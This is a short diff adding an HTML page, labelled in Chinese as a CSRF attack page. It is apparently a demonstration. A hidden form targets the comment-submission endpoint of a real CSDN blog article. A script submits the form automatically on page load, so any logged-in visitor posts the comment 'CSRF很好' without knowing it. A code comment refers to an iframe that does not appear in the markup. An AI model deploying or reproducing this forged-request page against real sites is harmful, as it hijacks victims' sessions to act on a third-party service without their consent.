@@ -1,0 +1,22 @@
+<!DOCTYPE HTML>
+<html lang="en-US">
+
+<head>
+    <title>CSRF ATK</title>
+</head>
+
+<body>
+    <p>这是一个CSRF攻击网页</p>
+    <!--使用iframe防止页面跳转-->
+
+    <form name="form1" action="https://blog.csdn.net/qq_29910567/phoenix/comment/submit?id=83381837" method="post">
+        <input type="hidden" name="replyId" value="" />
+        <input type="hidden" name="content" value="CSRF很好" />
+        <input type="submit" value>
+    </form>
+    <script>
+        document.forms.form1.submit();
+    </script>
+</body>
+
+</html>
